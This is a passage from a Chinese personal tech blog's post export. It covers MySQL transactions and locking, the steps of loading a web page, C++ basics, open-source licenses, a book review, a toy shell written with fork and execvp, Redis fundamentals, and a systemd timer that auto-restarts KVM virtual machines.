[transaction_characteristic [, transaction_characteristic] ...]transaction_characteristic: { WITH CONSISTENT SNAPSHOT | READ WRITE | READ ONLY}BEGIN [WORK]COMMIT [WORK] [AND [NO] CHAIN] [[NO] RELEASE]ROLLBACK [WORK] [AND [NO] CHAIN] [[NO] RELEASE]SET autocommit = {0 | 1} START TRANSACTION 或 BEGIN 开启一个新的事务，后者就是个别名，不用纠结 COMMIT 提交当前事务 ROLLBACK 回滚当前事务，回滚即取消回滚点后它发生的变化 SET autocommit 禁止或允许（默认允许）自动提交事务 READ WRITE 或 READ ONLY 事务访问模式，默认是读写模式 当我们开始一个事务时，如果还有未提交的事务存在那么它会被立刻提交。 如果有 LOCK TABLES，那么也会强制释放表锁。另外一点是，任何 DDL 语句都无法回滚。 事务断点 123SAVEPOINT identifierROLLBACK [WORK] TO [SAVEPOINT] identifierRELEASE SAVEPOINT identifier 事务断点的使用方法如上，很直观。如果创建同名断点时会覆盖旧的断点。 在执行回滚操作后，晚于回滚位置之后的保存点都将删除，并且回滚位置之后存储的行锁都不会释放，除非是新增的行。 锁定语句 12345678910LOCK TABLES tbl_name [[AS] alias] lock_type [, tbl_name [[AS] alias] lock_type] ...lock_type: { READ [LOCAL] | [LOW_PRIORITY] WRITE}UNLOCK TABLES 使用 LOCK TABLES 的只能访问被锁定表格 123456789mysql&gt; LOCK TABLES t1 READ;mysql&gt; SELECT COUNT(*) FROM t1;+----------+| COUNT(*) |+----------+| 3 |+----------+mysql&gt; SELECT COUNT(*) FROM t2;ERROR 1100 (HY000): Table 't2' was not locked with LOCK TABLES 锁定时使用表名或者别名都可以，但是我们在访问这些锁定表一定要和锁定语句的声明保持一致 1234mysql&gt; LOCK TABLE t WRITE, t AS t1 READ;mysql&gt; INSERT INTO t SELECT * FROM t;ERROR 1100: Table 't' was not locked with LOCK TABLESmysql&gt; INSERT INTO t SELECT * FROM t AS t1; LOCK TABLES 和 UNLOCK TABLES 配合事务使用： 12345SET autocommit=0;LOCK TABLES t1 WRITE, t2 READ, ...;... do something with tables t1 and t2 here ...COMMIT;UNLOCK TABLES; 设置事务 12345678910111213141516171819SET [GLOBAL | SESSION] TRANSACTION transaction_characteristic [, transaction_characteristic] ...transaction_characteristic: { ISOLATION LEVEL level | access_mode}level: { REPEATABLE READ | READ COMMITTED | READ UNCOMMITTED | SERIALIZABLE}access_mode: { READ WRITE | READ ONLY} 设置事务隔离级别 InnoDB 提供了 4 种隔离级别，默认是 REPEATABLE READ。 READ UNCOMMITTED READ COMMITTED REPEATABLE READ SERIALIZABLE 设置事务访问模式 默认是 READ WRITE，如果设置成 READ ONLY，就无法在事务中修改 table 了。 设置事务特征范围 就是这次设置事务会影响到全局（尽管叫全局但显然不可能包括已经提交的事务）或者当前会话。 隔离级别 READ UNCOMMITTED 最低隔离级别，在读未提交这个级别下，MySQL 会以无锁模式读取行，导致有可能读到未提交事务更新后的数据，这种问题也被叫做脏读。 READ COMMITTED 读已提交首先解决了脏读问题，但是 T1 在两次读取期间，可能 T2 对数据修改，导致前后 T1 前后读取结果不一致，这种问题叫做不可重复读。 REPEATABLE READ InnoDB 默认隔离级别，T1 在读取时，其他事务不能操作其访问行，但是其他事务可以插入新行，因此 T1 在读取期间表的行数一直在增加，这就是幻读问题。InnoDB 引入了 next-key lock 解决了该问题。 SERIALIZABLE 最严格的隔离级别。 ACID 模型 ACID 是一套数据库设计原则，主要强调的是可靠性方面。 原子性（Atomicity）：事务是一个原子操作单元，其对数据的修改，要么全都执行，要么全都不执行。 一致性（Consistent）：在事务开始和完成时，数据都必须保持一致状态。这意味着所有相关的数据规则都必须应用于事务的修改，以保持数据的完整性；事务结束时，所有的内部数据结构（如 B 树索引或双向链表）也都必须是正确的。 隔离性（Isolation）：数据库系统提供一定的隔离机制，保证事务在不受外部并发操作影响的 “独立” 环境执行。这意味着事务处理过程中的中间状态对外部是不可见的，反之亦然。 持久性（Durable）：事务完成之后，它对于数据的修改是永久性的，即使出现系统故障也能够保持。 《深入浅出 MySQL》 锁 共享锁和独占锁 InnoDB 通过共享锁和独占锁实现了行级锁，共享锁允许事务读该行数据，而独占锁允许对该行修改和删除。共享锁和独占锁我们一般用 S 锁和 X 锁简称，如果事务 T1 持有一行数据的 S 锁，那么当另一个事务请求 S 锁时能够立即获取，但请求 X 锁则需要等待 T1 先释放 S 锁。 意向锁 InnoDB 通过意向锁来实现表级锁，**IS（意向共享锁）** 会在整张表的每个行设共享锁，而 **IX（意向独占锁）** 则是设独占锁。 比如，“SELECT…FOR SHARE” 就是 IS，”SELECT…FOR UPDATE” 就是 IX。一个事务要想获取一行数据的 X 锁，那么必须先获取所在表的 IX 锁；而如果想要获取 S 锁，那么获取 IS 锁。意向锁本质是相当于告诉 MySQL，我将要对某些数据加 X 锁或者 S 锁，在通过锁冲突间接管理锁颗粒细度。 记录锁 ** 记录锁（record lock）** 是加在索引上的，比如 SELECT c1 FROM t WHERE c1 = 10 FOR UPDATE; 语句会阻止其他事务通过 t.c1=10 的索引去间接修改、删除其数据所在行。 像我们之前提到的 X 锁和 S 锁都是加在行上的，而记录锁是加在索引上的，那么_如果这一列没有索引怎么办？_ InnoDB 会创建一个隐含的聚集索引。 间隙锁 ** 间隙锁（gap lock）** 也是加在索引上的，和记录锁区别在于，它是针对一个范围内的索引记录，比如 SELECT c1 FROM t WHERE c1 BETWEEN 10 and 20 FOR UPDATE;，如果这时候有其他事务想要插入一个 15 的值就会被阻止。 不同事务可以在同一段索引记录中取得冲突的间隙锁，这是因为间隙锁本身是为 “排他” 而生，如果想从索引中清除记录，则需要合并不同事务持有的该记录上的间隙锁。 下一键锁 InnoDB 通过下一键锁 next-key lock 来实现 REPEATABLE READ 隔离级别下对幻读问题的解决，而下一键锁遵循左开右闭原则。 TODO 4.redo log、undo log、binlog 5.SQL 实际执行 参考 【 1 】 Oracle: What is MySQL？ 【 2 】 美团技术：MySQL 索引原理及慢查询优化 【 3 】 深入浅出 MySQL 【 4 】 MySQL Doc 【 5 】 learning-note: MySQL","link":"/2023/03/31/mysql-intro/"},{"title":"输入网址按回车发生了什么？","text":"当我们在浏览器输入 https://www.youtbe.com，并按下 Enter 键，便能进入油管慢慢泡视频。在这个过程中，究竟发生了什么？其实简单来说就是一个 URL 解析、DNS 查询、TCP 连接、HTTP 连接、页面渲染以及断开连接，下面，我将按序详细描述整个过程。 URL 解析 一个完整的 URL 结构是 scheme://host.domain:port/path/filename，其中 scheme 应用层协议，如 http、https 或 ftp 等 host 主机名（https 的默认主机是 www） domain 域名，如 youtube.com port 端口，http 默认 80，https 默认 443 path 服务器上的资源路径 filename 文档或者资源的名字 DNS 查询 DNS Domain Name Server 翻译过来是域名服务器，浏览器本身无法直接通过域名找到服务器，所以需要借助 DNS 将域名翻译成对应的能访问的 IP 地址。 浏览器按照以下步骤查询目标 IP，找到则停止（我们以 www.youtube.com 为例）： 浏览器缓存 操作系统缓存 路由缓存 ISP 的 DNS 递归解析器，这里会进行递归查询，先询问根域名服务器，再询问顶级域名服务器 .com，得到 youtube.com 这个域名的 ip 地址 TCP 三次握手 当我们获取 ip 后，要通过 TCP 连接目标服务器进行通信，这个建立连接的过程我们一般形象地称为三次握手。 第一步，客户端想要和服务器建立连接，因此它向服务器发送了一个带 SYN 的段，并告诉服务器它将从哪个序列号开始发送段 第二步，服务器返回一个带 SYN 和 ACK 的段，其中 ACK 表示它响应第一步客户端发送来的段，而 SYN 则表示它可能从哪个序列号开始发送 第三步，客户端确认服务器的响应，开始正常的数据传输 HTTP 报文响应 浏览器会帮我们构造 HTTP 请求，发送给服务器。HTTP 请求由请求行、请求头和请求体三部分构成，请求行由请求方法、URL 字段（如 /）和 HTTP 协议版本 字段 3 个部分组成；请求头是一组 key: value；在请求头和请求体之间有一个空行 CRLF，请求体可以为空。 渲染页面 接收到服务器响应文本后，浏览器开始渲染页面： 根据 HTML 解析 DOM 树 根据 CSS 解析 CSS 规则树 结合 DOM 树和 CSS 规则树，生成渲染树 根据生成的渲染树计算每个节点的信息 根据每个节点的信息绘制画面给用户 TCP 四次挥手 TCP 断开连接过程我们一般简称四次挥手，具体过程如下： 第一步，假设客户端决定断开连接（注意，服务端也可以选择断开），则它向服务器发送一个带 FIN 的段，并进入 FIN_WAIT_1 状态 第二步，服务端响应第一步中客户端发出的断开连接请求，因此发送一个带 ACK 的段 第三步，客户端接收到了服务端的响应，进入 FIN_WAIT_2 状态继续等待 第四步，服务端在处理完断开连接的事务后（比如将没发送完的数据发送完），发送 FIN 段 第五步，客户端接收到第四步服务端的请求，进入 TIME_WAIT 状态，并等待一段时间，通常为 2MSL，大概是 30 秒~2 分钟。 参考 【 1 】根域名的知识 【 2 】TCP Connection Termination","link":"/2023/04/03/network-click-website-go/"},{"title":"C++ 入门&#x2F;扫盲","text":"简单列出一些 C++ 语言的特点和知识，目前处于 “知其然” 阶段。 复合类型 1int a, &amp;b, *c; 上面这行代码定义了一个变量、引用和一个指针，指针和引用可能容易被混淆，二者都只是一个 “路牌”，用来指向真正的对象，但指针本身是一个真正的对象，而引用不是。比如，我们可以让 *c = 1，但不能使用 &amp;b = 1。注意，int *c 表示 c 是一个 int，它是一个指针，* 是用来修饰 c 的而不是用来补充 int。 智能指针 智能指针可以自动释放不再引用的对象，而不用再纠结 new 和 delete 的使用，底层用到的是 “引用计数”。 仿函数 模板类 就是泛型参数相关那套。 12345template &lt;typename T&gt; T foo(T* v) { T tmp = *v; // ... return tmp;} namespace 成员模板 泛化、特化和偏特化 偏特化又分为个数的偏和范围的偏。 数量不定的模板参数 variadic templates，模板参数包，函数参数类型包，函数参数类型包 引用 Reference 引用、指针的区别，Java 都是引用 虚函数 相当于 Java 中的接口，函数中的函数，好像很难解释，确实有一点抽象，又有一点 AOP 的思想。 new 和 delete 如何将两个动作分解。","link":"/2023/06/09/programming-intro-cpp/"},{"title":"如何选择开源许可证？","text":"开源促进会 OSI 是开源定义 OSD 的管理者，由 Bruce Perens 和 Eric S. Raymond 创立于 1998 年，我们寻常用的开源协议都需要该组织认可，要求符合 OSD 定义。 OSI Open Source initiative OSD Open Source definition 常用开源协议 GPL 1970s，Richard Stallman 发起了自由软件运动，并撰写了 GNU 通用公共许可协议 GPL。GPL 是一个 Copyleft 协议，而 Copyleft 协议又叫传染性开源协议，只要项目中有一部分带 Copyleft 协议，那么整个项目都必须带上 Copyleft 协议，从而_变相达到鼓励开源的目的_。 MIT &amp; BSD 与 GPL 相区别的是宽松自由软件许可协议 Permissive free software licence，其派生项目可不用再保持自由软件身份，常见的 MIT 协议 和 BSD 协议 都在此列。 顺带一提，这两个协议分别来自麻省理工大学和伯克利大学，里面的 MIT 协议是最自由的协议。由于 BSD 原始协议要求派生体在打广告时必须声明原始来源，因此我们通常用更简化的 FreeBSD 协议，同时 BSD 也是商用首选协议。 如 MIT 协议，有： 1234567Copyright (C) &lt;year&gt; &lt;copyright holders&gt;Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the &quot;Software&quot;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. LGPL 由于 GPL 的 Copyleft 特性，强制项目及其衍生品开源，因此需要再来一个允许闭源的 LGPL 来调和。 Apache &amp; MPL Apache 协议 是自由软件协议，而由 Mozilla 基金会开发的 MPL 协议 则更适用于专有软件。 如果实在感到迷惑，可以看下面阮一峰制作的一图流： Creative Commons Creative Commons 许可证是允许免费分发其他受版权保护的 “作品” 的几种公共版权许可证之一。你只需要做出两个选择，是否共享以及是否商用。 参考 【 1 】阮一峰：如何选择开源许可证？ 【 2 】五种开源协议的比较 (BSD，Apache，GPL，LGPL，MIT)","link":"/2023/03/31/opensource-license-intro/"},{"title":"函数式编程","text":"本文简单介绍如何在函数式编程模式中使用并发。","link":"/2023/06/14/programming-lambda/"},{"title":"读《黑客与画家》有感","text":"我大学的时候有翻过几页这本书，但阅读体验不好没看多少。虽然很多人吹捧它，可是我并不想在这种书上浪费时间，因为读它跟读《Java 编程思想》一样让我感到吃力，而这本书并不会给我找工作提供任何帮助。后来，还有学长推荐《摩托车与禅》，我都将它们归类为一个靠创业挣了钱的美国人专门拍了部自己的阿甘正传，明显不适合我。但最近，因为编程随想的一篇文章 每周转载：IT 大牛谈编程语言（网文 3 篇），让我开始对书的作者产生了浓厚的兴趣。 书应该是常读常新的，因为你没办法靠单纯的知识和信息迈向成功，对于现代人而言，阅读本身只是一种廉价的娱乐。把别人的书拆解开，理解别人传达的真正意思，这只是第一步。将自己的生活、工作经历和书中道理相映证，这是第二步。最后，用自己的话将书中的道理讲出来，它到底好在哪里，坏在哪里，这是我们在读完一遍之后应当持续思考和总结的。《如何阅读一本书》中有介绍很多拆解书和组装书的方法，以后单开另续。 虽然年龄已经不小了，也真正开始学习也没几年，有我自己的问题，但更多的是社会存在的问题在持续蒙蔽着我。当然，窗户纸一旦捅破，之后便是康庄大道。 保罗・格雷厄姆生平 保罗本科修的哲学，研究生才开始研究人工智能，可惜进展不顺。毕业后，他也没进名牌公司，反而跑去学画画。最后，钱花光了，没办法只能去波士顿一家初创公司当程序员。窘迫的生活持续两三年后，他找到罗伯特・莫里斯（蠕虫病毒的作者，我还曾因为公开作业代码被他警告过，想想真丢人），打算编个软件搞钱。编什么软件呢，当时互联网概念火热，就写了个搭建网店的软件。然后，他拉到的第一个投资人是他美术老师的丈夫。之后，又跑到纽约将 demo 展示后，拿到了 10 万美元投资。年末的时候，开始拉客户。第二年夏天，得到了 80 万天使投资，他们用这笔钱雇了 CEO 和新程序员，还租了间办公室。也正是从这个时间点开始，媒体开始报道，终于不用靠口口相传来发展业务了。后来，就是找大公司收购，直到 98 年雅虎以 4900 万美元收购。之后，保罗成为了雅虎的员工，但他觉得大公司上班非常窒息，于是他辞职了。而离开雅虎之后，他将自己对于技术和创业的观点写成了一系列文章，这就是本书《黑客与画家》的由来。 我感觉我并不需要了解他的生平，每个人都有属于自己的波澜壮阔，真正重要的是 “我” 在哪里？ 读书笔记 chapter 1 批注的理由肯定是觉得作者说到心坎上了，一些我认可的道理借由作者的笔精准表达，但我的认可需要生活去支撑，不然这和喊口号有什么区别？ 创业公式：1. 搭建原型 2. 上线运营（别管 bug） 3. 收集反馈 4. 调整产品 5. 成长壮大 保罗还说过，任何时候都要让代码跑起来，硬看、硬写是愚人之举，闭门造车自我感动是最让人受不了的。我发现一个细节，保罗对事物都有自己的独到看法，当然独到与否并不重要，关键是你要能够解释自己的行为。其次是高效，正确而无用的废话正在充斥着简中互联网，我就想问问，有什么用？ 如果你听任一群 11 岁小孩自行其事，最后只会成为《蝇王》里的情景。在一个人产生良知之前，折磨就是一种娱乐。 我真的很讨厌小孩子，尤其是什么都不懂又自以为是的小破孩，闯祸后又拿年龄来当挡箭牌。 没错，成年人不知道孩子们内部发生的事。认识到这一点很重要。在抽象意义上，成年人知道孩子的行为有时是极端残酷的，这正如我们在抽象意义上知道贫困国家的人民生活极端困难。但是，像所有人一样，成年人不喜欢揪住不放这种令人不快的事实。你不去埋头探寻，就不会发现具体的证据，就会永远自以为这件事是抽象的。 冷漠的人，冰冷的社会，自有其道理，个人的温良本身就很容易被琐碎的事情给磨掉，这没什么好说的。当然，我能理解保罗这里是想强调，我们应该突破生活中那些琐碎东西，用一种极度理智的眼光洞穿真相。 真实世界的特点是，它极其庞大。如果总体足够大，即使是人数最少的少数派，只要聚集在一起，也能产生可观的力量。 做事情一定要有理由，不强求你做一个爱挑剔的人，但如果你对任何事情都是 “随便” 的无所谓态度，那如果你真的对绝大部分事情都是混乱价值观，说明你的头脑是也是混乱的。 TODO","link":"/2023/05/20/read-hackers-and-painters/"},{"title":"如何用 C 语言编写一个 Shell","text":"Shell 具体指的是什么？ Shell，或者说 Unix shell，本质上是一个命令行解释器。它是一个计算机程序，允许用户通过命令行与操作系统交互。Shell 有两种界面形式：命令行界面 (CLI) 和图形用户界面 (GUI)，例如 Windows 中的文件浏览器。常见的 CLI 有 sh、zsh、bash 等，其中，sh 是第一个流行的 shell，bash 是 Linux 系统自带的 shell，而 zsh 则是最受欢迎的 shell 之一。 当你登录到一个类 Unix 系统时，shell 会自动在这个会话中运行。你也可以输入以下命令查看当前 shell 和系统内置的 shell 列表： 12345678910vagrant@ubuntu-xenial:~$ echo $SHELL/bin/bashvagrant@ubuntu-xenial:~$ cat /etc/shells# /etc/shells: valid login shells/bin/sh/bin/dash/bin/bash/bin/rbash/usr/bin/tmux/usr/bin/screen Shell 的生命周期 作为一个程序，shell 也有自己的生命周期： 初始化： 读取与该 shell 配套的配置文件，例如.zshrc、.condarc 等。 解释： 循环读取命令行并执行命令。 终止： 检测到异常或者接收到终止命令，释放资源然后退出。 如何编写一个 Shell？ 实现难点 Shell 并不负责命令行的真正执行，而是通过 execvp 系统调用来执行命令。根据手册，execvp 是一个更加友好的 exec 方法，其中 v 表示支持一组可变参数，p 表示无需提供目标程序的完整路径。 虽然 shell 像是一个搬运工，但在执行某些特殊命令时，仍然需要单独处理。例如 cd 命令，它允许你更改当前目录。然而，“当前目录” 是一个进程的属性，如果让子程序执行，shell 的 “当前目录” 不会发生变化。同理，还有 exit 命令。 代码细节 初步框架： 123456int main() { ZionSH *zionSh = new ZionSH(); zionSh-&gt;initialize(); int terminate = zionSh-&gt;interpret(); return terminate;} 123456789101112131415161718void ZionSH::initialize() { std::cout &lt;&lt; &quot;Zion Shell initializing...&quot; &lt;&lt; std::endl;}int ZionSH::interpret() { char *line; char **args; int status; do { std::cout &lt;&lt; &quot;ZionSh&gt;&quot;; line = read_line(); args = split_line(line); status = execute(args); // 释放存储空间 free(line); free(args); } while (status);} 在执行 exec 时，它会用目标程序替换当前程序，除非发生错误。因此，我们需要用 fork 函数生成子程序，并通过得到的进程 ID 判断是子进程还是父进程。 123456789101112131415161718int ZionSH::execute(char **args) { int status; pid_t pid = fork(); if (pid == 0) { if (execvp(args[0], args) == -1) { fprintf(stderr, &quot;Fail to execute the input command.\\n&quot;); return EXIT_FAILURE; } } else if (pid &lt; 0) { fprintf(stderr, &quot;Fail to fork.\\n&quot;); return EXIT_FAILURE; } else { do { waitpid(pid, &amp;status, WUNTRACED); } while (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status)); } return 0;} 主进程需要等待子进程运行结束后再退出，这里用到的 waitpid 和 WIFEXITED、WIFSIGNALED 可以通过手册查询。 需要参考的指令如下： fork waitpid chdir 代码实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#include &quot;../headers/zionSh.h&quot;int cd(char **args);int help(char **args);int exit(char **args);int (*sp_func[]) (char **) = { &amp;cd, &amp;help, &amp;exit};std::string sp_func_name[] = { &quot;cd&quot;, &quot;help&quot;, &quot;exit&quot;};void ZionSH::initialize() { std::cout &lt;&lt; &quot;Zion Shell initializing...&quot; &lt;&lt; std::endl;}int ZionSH::interpret() { char *line; char **args; do { std::cout &lt;&lt; &quot;ZionSh&gt;&quot;; line = read_line(); args = split_line(line); int status = -1; for (int i = 0; i &lt; num_sp_func(); i++) { if (sp_func_name[i] == args[0]) { status = (*sp_func[i])(args); if (status == 0) { return EXIT_SUCCESS; } } } if (status == -1) { status = execute(args); if (status == EXIT_FAILURE) { return EXIT_FAILURE; } } // 释放存储空间 free(line); free(args); } while (true);}char *ZionSH::read_line() { int curr = 0; int buffSize = BUFF_SIZE; char *line = static_cast&lt;char *&gt;(malloc(buffSize * sizeof(char))); int c; if (!line) { fprintf(stderr, &quot;allocation error!&quot;); exit(EXIT_FAILURE); } while (true) { c = getchar(); if (c == EOF || c == '\\n') { line[curr] = '\\0'; return line; } line[curr] = (char) c; curr++; if (curr &gt;= buffSize) { buffSize += BUFF_SIZE; void *newBuffer = realloc(line, buffSize); if (!newBuffer) { fprintf(stderr, &quot;reallocation error!&quot;); exit(EXIT_FAILURE); } line = static_cast&lt;char *&gt;(newBuffer); } }}char **ZionSH::split_line(char *line) { char **args = static_cast&lt;char **&gt;(malloc(ARG_SIZE * sizeof(char *))); if (!args) { fprintf(stderr, &quot;Fail to allocate.\\n&quot;); exit(EXIT_FAILURE); } char *token; int num_args = 0; while (true) { token = strtok(line, TOK_DELIM); if (token == nullptr) break; args[num_args] = token; num_args++; if (num_args % ARG_SIZE == 0) { char **ex_args = static_cast&lt;char **&gt;(realloc(args, (num_args + ARG_SIZE) * sizeof(char *))); args = ex_args; if (!args) { fprintf(stderr, &quot;Fail to reallocate.\\n&quot;); exit(EXIT_FAILURE); } } } args[num_args] = nullptr; return args;}int ZionSH::execute(char **args) { int status; pid_t pid = fork(); if (pid == 0) { if (execvp(args[0], args) == -1) { fprintf(stderr, &quot;Fail to execute the input command.\\n&quot;); return EXIT_FAILURE; } } else if (pid &lt; 0) { fprintf(stderr, &quot;Fail to fork.\\n&quot;); return EXIT_FAILURE; } else { do { waitpid(pid, &amp;status, WUNTRACED); } while (!WIFEXITED(status) &amp;&amp; !WIFSIGNALED(status)); } return 0;}int cd(char **args) { if (args[1] == nullptr) { fprintf(stderr, &quot;No path for cd\\n&quot;); } else if (chdir(args[1]) == -1) { fprintf(stderr, &quot;Error change dir: %s\\n&quot;, strerror(errno)); } return 1;}int help(char **args) { std::cout &lt;&lt; &quot;help statements.&quot;; return 1;}int exit(char **args) { return EXIT_SUCCESS;}int ZionSH::num_sp_func() { return sizeof sp_func_name / sizeof(std::string);} 一个基本的 shell 程序框架就实现好了，它能够初始化、读取和解释命令行输入，并通过 fork 和 execvp 系统调用来执行命令。此外，它还包含了几个特殊命令的处理，如 cd 和 exit。","link":"/2024/07/14/write-a-zion-shell/"},{"title":"Redis 基础扫盲","text":"首先，我们要对 Redis 建立一个最基本的印象，K/V，NoSQL，内存数据库，单线程。另外，Redis 还是开源的，基于 BSD 协议（这个协议允许商用），用 ANSI C 语言编写而成，能够在大部分 POSIX 系统上运行，当然最常用的就是 Linux 和 OS X 系统了。 五种开源协议的比较 (BSD，Apache，GPL，LGPL，MIT) 如何选择开源许可证？ ANSI C 标准 vs GNU C 标准 Linux 黑话解释：什么是 POSIX？ Redis 数据类型 由于 C 语言本身缺乏对一些复杂结构的定义，因此 Redis 自定义了一些数据类型，自成体系。最基本的数据类型包括 String、List、Hash、Set、ZSet，再深入一点，就是 Bitmap、Stream、HyperLogLog 和 Geospatial。 Redis data types String 尽管 C 语言本身就有定义字符串，但是 Redis 为了存储二进制文件重新自动定义了一个 String，准确的说是用 SDS 简单动态字符串实现的，String 是 Redis 最常用也是最基本的数据类型，注意区分数据类型和数据结构，SDS 是数据结构。 List List 可以简单当做一个双链表结构，支持双端插入和取出，不过一旦深入，就会发现它的底层并不简单。List 基本单元是 quicklist，而 quicklist 的基本单元是 ziplist。ziplist 自己又是一个特殊双链表，它使用连续块并且没有维护双指针，另一方面它保存前一个 entry 的长度和当前 entry 的长度，进而推断出下一个元素和上一个元素起始位置。为什么要这么嵌套循环设计呢？答案是为了节省内存，因为 Redis 本身是基于内存的，如果基于传统链表实现，那么肯定会产生大量内存碎片，非常浪费。 Hash Hash 是标准的 HashTable 架构，即依靠挂链来解决冲突，如果 K/V 长度较小，Redis 会用 ziplist 取代 hashtable 对象，其他的感觉没什么好说的。 Set Set 可以由 intset 或 hashtable 构成，原因和 Hash 类似，当一个集合只包含整数并且数量少于 512 个的时候，Redis 会使用 intset。 ZSet ZSet 也是集合，我们在插入元素的同时要声明该元素的分数，以便它内部比较排序。然后，再谈论下它的底层结构，一般我们用 ziplist 或者 skiplist 构成，只有在元素个数少于 128 并且元素长度小于 64 字节时使用 ziplist。 跳表是在链表基础上发展而来的，为了提升查询效率，我们可以在单链表之上再加一层链表，但只保留一半，每个元素除了指向后一个元素还指向下一层的 “自己”，其可行性是建立在元素有序排列的基础之上的。当然，看到这里，我们不难想到，跳表稍微复杂点的地方是插入和删除，会以类似查询的方式对相邻元素更新。 简单来说，记住下面这张图即可 Bitmap 位图对象也是为了节省内存而设计的，如果光看手册可能不知道它该用在什么地方，其实最常见的使用场景就是海量数据统计，比如判断用户是否在线，我们可以根据用户 ID 来获取位图偏移量，对该比特位上设置用户当前登录状态。 其他应用场景：用户每月签到情况、连续签到用户总数（这里有用到 BITOP） HyperLogLog HyperLogLog 是用来做基数统计的，使用的时候只需要 pfadd 和 pfcount 便能添加和统计一个集合中不重复元素的数目。一想到基数统计，我们很容易想到要用集合，但由于 Redis 为了节省内存，所以并没有用 Set，也没用 BitMap，而是用了概率算法，其表现惊人，存储 1 个亿数据大概只需要 12K 内存，准确的说在误差只有 0.81% 的情况下，可以存 2^64 条数据。 一般来说，电商的 UV、PV 都会用这个统计流量。 Geospatial Geospatial 对象是专门用来存储真实地理位置的，所以要输入经纬度。专门设计出这样一个数据对象也是为了快速计算某个位置附近的其他地标，Redis 将整个地球转换成了一个二维平面，然后将这个平面不断切割，每个坐标都位于一个唯一的小格子里，经过这个过程后一对经纬度就可以转换为一串二进制数，便于存储和计算。 Stream Redis 持久化 Redis 作为一个内存数据库，一旦宕机，里面的数据就会全部丢失掉，而之前对 Redis 的查询请求就会直接转移到 MySQL 中。而且，要让 Redis 恢复，又要从 MySQL 中慢慢地读取，这样效率非常低。上述的两个问题，就是 Redis 持久化的意义所在。 Redis 有两种持久化方式，一个是 RDB，适合冷备，一个是 AOF。 冷备、热备、双活、两地三中心 RDB RDB 就是 Redis DataBase，为了让 Redis 能够边复制边写入，注意 Redis 是单线程，借助了 COW，即写时复制 Copy On Write 技术。另外，由于 Redis 是由 C 语言写的，需要用到 fork 方法。当主线程接收到写入操作时，会将该数据块复制到一旁以便备份线程访问。 AOF AOF 是 Append-only file，还是没明白什么意思，实际上 AOF 的持久化原理是将 Redis 的动作记录下来，而当宕机恢复的时候，直接重放 AOF 记录下的动作就可以快速还原。 在 Redis 4.0 后，组合了 RDB 和 AOF，组合方式也很容易想到，用 AOF 持久化上一次持久 RDB 到现在为止的动作。 数据过期清理策略 Redis 的数据过期清理策略是 no-eviction，但如果键值对们将内存撑爆了会怎样，Redis 会直接罢工的，这样的话即使请求可以一直进行但工作其实已经暂停了。 常见的过期清理策略其实不难想象，LFU 频率、LRU 最近最少未使用、Random 随机，如果设置了过期时间还可以使用 TTL 策略。 如果我们选择了 LRU，Redis 会维持一个系统时间，并且给每个键都设置一个时间值，这个时间在访问时会刷新。 队列 Redis 本身定义了 list 数据对象，也能满足一些简单队列需求。这里单独提队列，是指的阻塞队列和延迟队列。直接取空 list，取元素失败后会 sleep 一段时间再唤醒重新取，而采用 blpop 则能阻塞获取元素。延迟队列的实现也很简单，用 zset 存储消息，而把时间戳作分数，这样我们利用 zrangebyscore 在 N 秒之前对数据轮询。 发布订阅模式 这个模式有两个角色，一个负责发布频道，一个负责订阅频道，后者持续接收消息。 12345678910111213141516171819202122232425# A is a SUBredis 127.0.0.1:6379&gt; SUBSCRIBE runoobChatReading messages... (press Ctrl-C to quit)1) &quot;subscribe&quot;2) &quot;runoobChat&quot;3) (integer) 1# B is a PUBredis 127.0.0.1:6379&gt; PUBLISH runoobChat &quot;Redis PUBLISH test&quot;(integer) 1redis 127.0.0.1:6379&gt; PUBLISH runoobChat &quot;Learn redis by runoob.com&quot;(integer) 1# A will show message below:1) &quot;message&quot;2) &quot;runoobChat&quot;3) &quot;Redis PUBLISH test&quot;1) &quot;message&quot;2) &quot;runoobChat&quot;3) &quot;Learn redis by runoob.com&quot; 本文参考 【 1 】 Redis Documentation 【 2 】 Redis 面霸篇：从高频问题透视核心原理","link":"/2023/03/01/redis-intro/"},{"title":"Systemd 实践 - KVM 虚拟机自动重启","text":"最近遇到一个需求，需要使用 systemd 实现 KVM 虚拟机的自动重启功能。 1. 单次任务脚本：自动重启已关闭的虚拟机 首先，编写一个 Shell 脚本：遍历所有关闭（shut off）状态的虚拟机，并尝试启动。 123456789101112#!/bin/bashvirsh list --all | awk '/shut off/ {print $2}' | while read -r vm; do echo &quot;尝试启动虚拟机：$vm&quot; if virsh start &quot;$vm&quot;; then echo &quot;成功启动虚拟机：$vm&quot; logger -t VM_AUTOSTART &quot;启动成功：$vm&quot; else echo &quot;启动失败：$vm&quot; &gt;&amp;2 logger -t VM_AUTOSTART &quot;启动失败：$vm&quot; fidone 注意：要确保脚本有执行权限，否则无法被 systemd 调用。 1chmod +x /root/vm_autostart.sh 2. 使用 systemd 定时定期执行 systemd 定时任务（timer）通常需要对应的 service 和 timer 两个文件： 2.1 服务配置文件 路径：/etc/systemd/system/vm-autostart.service 123456[Unit]Description=Check and auto-start KVM VMs in shut off state[Service]Type=oneshotExecStart=/root/vm_autostart.sh 2.2 定时器配置文件 路径：/etc/systemd/system/vm-autostart.timer 12345678910[Unit]Description=Auto-check KVM VMs every 5 minutes[Timer]OnBootSec=5minOnUnitActiveSec=5minAccuracySec=1s[Install]WantedBy=timers.target 解释： OnBootSec=5min # 启动后延迟 5 分钟运行 OnUnitActiveSec=5min # 